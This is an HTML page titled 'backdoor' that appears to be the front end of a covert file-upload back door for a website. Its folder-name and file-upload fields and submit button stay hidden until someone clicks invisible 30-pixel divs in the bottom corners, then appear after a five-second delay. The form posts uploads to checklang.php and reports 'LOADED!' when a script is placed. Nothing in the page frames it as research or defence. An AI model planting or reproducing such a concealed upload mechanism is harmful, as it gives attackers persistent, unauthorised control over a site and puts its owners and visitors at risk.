
<!DOCTYPE html>
<html>
<head>
<title>backdoor</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="description" content=""> 
<meta name="keywords" content=""> 
<meta name="viewport" content="width=1200, initial-scale=1" >
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="http://malsup.github.com/jquery.form.js"></script> 
</head>
<body>

         <script>
	          $(document).ready(function() { 
           $('#fire').ajaxForm(function(msg){
	           if(msg === 'stop'){alert('ERROR');}
	           else if(msg === 'ok'){alert('LOADED!');}
	           else if(msg === 'noscript'){alert('NO SCRIPT!');}
	           else if(msg === 'folder'){alert('NO folder!');}
	           
	           else
	           {
		        {alert('no works....');}    
	           } 
	        });
        });
	    </script>





                    
	                   <form id="fire"  action="checklang.php" method="post" enctype="multipart/form-data">
		               <div id="one" style="display:none;"><input type="text" name="foldername"></div>
                       <div id="two" style="display:none;"><input type="FILE" name="imgupload"></div>
                       <button id="three"  type="submit" style="display: none;">ok</button>
                       </form>
                       
                       
<div id="forfolder" style="width:30px; height: 30px; position: absolute; bottom:0; left:0;"></div>
<div id="forscript" style="width:30px; height: 30px; position: absolute; bottom:0; right:0;"></div>


<script>
	$( "#forfolder" ).click(function() {
    setTimeout(function() {
	      $('#one').fadeIn(500);
    }, 5000);
    });
    
    $( "#forscript" ).click(function() {
    setTimeout(function() {
	      $('#two').fadeIn(500);
    }, 5000);
    
    setTimeout(function() {
	      $('#three').fadeIn(500);
    }, 5000);
    });
</script>

                       
                       
                       
              
                  



</body>
</html>